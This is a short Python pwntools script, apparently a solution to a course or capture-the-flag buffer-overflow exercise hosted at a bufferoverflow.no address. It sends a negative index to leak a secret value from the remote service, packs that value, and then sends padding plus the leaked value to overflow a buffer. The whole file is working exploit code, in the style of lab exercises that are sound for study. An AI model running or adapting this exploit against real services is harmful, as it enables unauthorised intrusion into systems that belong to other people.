import pwn

target = 'oblig1.bufferoverflow.no'
port = '7004'

bufferfill = b'A' * 16
buffer_to_secret_dst = b'-48'

remote = pwn.remote(target, port)

print(remote.recvline())
print(remote.recvline())

remote.sendline(buffer_to_secret_dst)

print(remote.recvline())

read_secret = remote.recvline()
print(read_secret)

secret_val = pwn.p64(int(read_secret, 16))

print(remote.recvline())

remote.sendline(bufferfill + secret_val)

print(remote.recvall())
remote.close()